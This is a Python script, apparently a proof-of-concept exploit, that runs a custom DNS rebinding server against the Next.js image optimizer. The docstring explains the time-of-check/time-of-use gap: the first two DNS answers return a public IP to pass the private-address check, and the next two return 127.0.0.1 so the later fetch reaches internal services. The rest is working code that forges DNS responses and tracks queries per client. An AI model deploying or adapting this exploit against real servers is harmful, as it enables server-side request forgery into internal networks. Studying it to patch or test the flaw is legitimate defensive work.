#!/usr/bin/env python3
"""
Custom 4-Query DNS Rebinding Server
====================================

Next.js image optimizer makes 4 DNS queries per request:
- Queries 1-2: lookup() for isPrivateIp() validation
  → Return PUBLIC IP (8.8.8.8) to pass the private IP check
  
- Queries 3-4: fetch() resolves hostname again (TOCTOU flaw)
  → Return PRIVATE IP (127.0.0.1) to redirect request to internal service
  
This exploits the gap between validation and fetch - the validated IP
is never used, allowing attacker to redirect the actual request anywhere.
"""

import socket
import struct
import time
from collections import defaultdict

PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"
DNS_PORT = 53

client_state = defaultdict(lambda: (0, 0))

def ip_to_bytes(ip):
    return bytes(int(x) for x in ip.split('.'))

def build_response(query, ip):
    response = query[:2]
    response += struct.pack(">H", 0x8180)
    response += struct.pack(">HHHH", 1, 1, 0, 0)
    q_end = 12
    while query[q_end] != 0:
        q_end += 1
    q_end += 5
    response += query[12:q_end]
    response += struct.pack(">H", 0xc00c)
    response += struct.pack(">HH", 1, 1)
    response += struct.pack(">I", 0)
    response += struct.pack(">H", 4)
    response += ip_to_bytes(ip)
    return response

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', DNS_PORT))
    
    print("=" * 50)
    print(" 4-Query DNS Rebinding Server")
    print("=" * 50)
    print("Queries 1-2: PUBLIC (validation)")
    print("Queries 3-4: PRIVATE (fetch = SSRF!)")
    print("=" * 50)
    
    while True:
        data, addr = sock.recvfrom(512)
        client = addr[0]
        now = time.time()
        
        count, last_time = client_state[client]
        
        if now - last_time > 5:
            count = 0
        
        count += 1
        
        # Queries 1-2: PUBLIC, Queries 3-4: PRIVATE, then reset
        if count <= 2:
            ip = PUBLIC_IP
        else:
            ip = PRIVATE_IP
        
        # Reset after 4 queries
        if count >= 4:
            count = 0
        
        client_state[client] = (count, now)
        print(f"[{client}] Q{count} -> {ip}")
        sock.sendto(build_response(data, ip), addr)

if __name__ == "__main__":
    main()
